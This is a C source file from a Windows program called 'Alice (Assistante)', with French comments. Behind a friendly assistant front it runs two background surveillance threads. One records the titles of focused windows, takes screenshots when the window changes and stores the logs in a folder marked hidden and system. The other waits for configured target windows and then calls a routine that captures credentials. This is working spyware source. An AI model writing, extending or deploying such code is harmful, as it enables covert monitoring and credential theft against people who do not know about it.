//=============================================================================
// Projet : Alice (Assistante)
// Fichier : threads.c
//
//=============================================================================

#include "resources.h"


//=============================================================================
//    Thread 1 : Controleur (contrôle et enregistre les fenêtres visitées)
//=============================================================================

DWORD  WINAPI Controleur(LPVOID lParam)
{
   HWND hwnd = NULL;
   char log[MAX_TMP], nomFenActuelle[MAX_FENETRE_TAILLE], nomFenPrecedente[MAX_FENETRE_TAILLE];
   SYSTEMTIME Time;
   
   GetSystemTime(&Time); /* On récupère le temp */
   
   sprintf(dossier, "%s\\%02d-%02d-%02d", PATH_TO_LOG, Time.wDay, Time.wMonth, Time.wYear); /* On crée un nv dossier */
   //SetFileAttributes(PATH_TO_LOG, FILE_ATTRIBUTE_NORMAL); /* Déverouillage du dossier qui contient les logs */
   CreateDirectory(dossier, NULL); /* S'il existe déjà il ne sera pas recrée */
   if (GetLastError() == ERROR_PATH_NOT_FOUND) /* Si PATH_TO_LOG introuvable */
   {
      CreateDirectory(PATH_TO_LOG, NULL); /* Création du dossier "logs" */
      SetFileAttributes(PATH_TO_LOG, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); /* Vérouillage du dossier */
      CreateDirectory(dossier, NULL); /* On essaye une 2ème fois de le crée */
   }
   //SetFileAttributes(PATH_TO_LOG, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); /* Vérouillage du dossier */
   sprintf(FICHIER_LOG, "%s\\%02d-%02d-%02d.txt", dossier, Time.wDay, Time.wMonth, Time.wYear); /* chemin + nom fichier log */
   
   /* On enregistre l'heure du démarrage (dans le fichier log) */
   sprintf(log, "# %02d/%02d/%02d - %02d:%02d:%02d : Démarrage\n"
   , Time.wDay, Time.wMonth, Time.wYear, Time.wHour, Time.wMinute, Time.wSecond);
   enregistrerEtLireLog(log, &lParam, FICHIER_LOG, TRUE, FALSE, TRUE);
   //Sleep(3000); /* On attend 3 secondes */
   if (ACTIVE_MSG_ACCUEIL)
   {
      if ((Time.wHour == jourHeure && Time.wMinute >= jourMinute) || (Time.wHour > jourHeure && Time.wHour < nuitHeure) || (Time.wHour == nuitHeure && Time.wMinute < nuitMinute))
         afficherTrayIconBallon(NOM_APP, "Konichiwa !", 2000, TRUE); /* Message d'acceuil */
      else /* Si nn, c'est le soir */
         afficherTrayIconBallon(NOM_APP, "Konbanwa !", 2000, TRUE); /* "Konishiwa" == "bonjour" et "Konbanwa" == "bonsoir" */
   }
   
   while (1)
   {
      Sleep(300000); /* On attend 5 minutes avant chaque contrôle */
      
      GetSystemTime(&Time); /* On récupère le temp */
      HWND currenthwnd = GetForegroundWindow(); /* Handle de la fenêtre en focus/actuelle */
      GetWindowText(currenthwnd, nomFenActuelle, MAX_FENETRE_TAILLE); /* Récupération du nom de la fenêtre actuelle */
      
      if (currenthwnd != hwnd) /* Si le handle de la fenêtre actuelle != du handle de la fenêtre précedente */
      {
         hwnd = currenthwnd; /* Sauvegarde du hwnd (handle de la fenêtre) */
         sprintf(nomFenPrecedente, "%s", nomFenActuelle); /* Sauvegarde du nom de la fenêtre */
         sprintf(log, "impscreen %s %d", dossier, DEFAULT_IMPR_QUALITY);
         callProgram(SCREENSHOT_EXE, log); /* On lance le programme de capture d'écran */
         sprintf(log, "=> %02d:%02d : ($)[%s]\n", Time.wHour, Time.wMinute, nomFenActuelle);
         enregistrerEtLireLog(log, &lParam, FICHIER_LOG, TRUE, FALSE, TRUE);
      }
      else if (lstrcmp(nomFenPrecedente, nomFenActuelle)) /* Si le nom de la fenêtre a changé */
      {
         sprintf(nomFenPrecedente, "%s", nomFenActuelle); /* Sauvegarde du nom de la fenêtre */
         sprintf(log, "=> %02d:%02d : [%s]\n", Time.wHour, Time.wMinute, nomFenActuelle);
         enregistrerEtLireLog(log, &lParam, FICHIER_LOG, TRUE, FALSE, TRUE);
      }
   }

return 0;
}

//=============================================================================
//   Thread 2 : AntiVoyou (enregistre les identifiants des personnes inconnus)
//=============================================================================

DWORD  WINAPI AntiVoyou(LPVOID lParam)
{
   HWND hFenetre = NULL;
   char nomFenetre[MAX_FENETRE_TAILLE], *buffer;
   buffer = malloc(MAX_FENETRE_TAILLE);
   int len;
   
   while (1)
   {
      while (etatConnexion()) /* Tant que la connexion existe */
      {
         hFenetre = GetForegroundWindow(); /* On récupère le handle de la fenêtre qui a le focus */
         GetWindowText(hFenetre, nomFenetre, MAX_FENETRE_TAILLE); /* On récupère le nom de cette fenêtre */
         
         FILE *fichier = fopen(FICHIER_FCIBLE, "r"); /* On ouvre le fichier qui contient les fenêtres cibles */
   
         if (fichier != NULL)
         {
            while (fgets(buffer, MAX_FENETRE_TAILLE, fichier) != NULL) /* On lit ligne par ligne le fichier tant qu'on ne reçoit pas d'erreur */
            {
               len = lstrlen(buffer)-1;
               if (buffer[len] == '\n')
                  buffer[len] = '\0'; /* On enlève '\n' de buffer */
               if (rechercherChaineDansChaine(nomFenetre, buffer)) /* Si c'est la fenêtre cible */
               {
                  recupererIdentifiants(&lParam, buffer);
                  break; /* On sort de la dernière boucle */
               }
            }
      
            fclose(fichier);
         }
         
         Sleep(3000); /* On attend 3 secondes */
      }
      
      Sleep(10000); /* On attend 10 secondes */
      
   } // Sortie du while(1)
   
   free(buffer);

return 0;
}
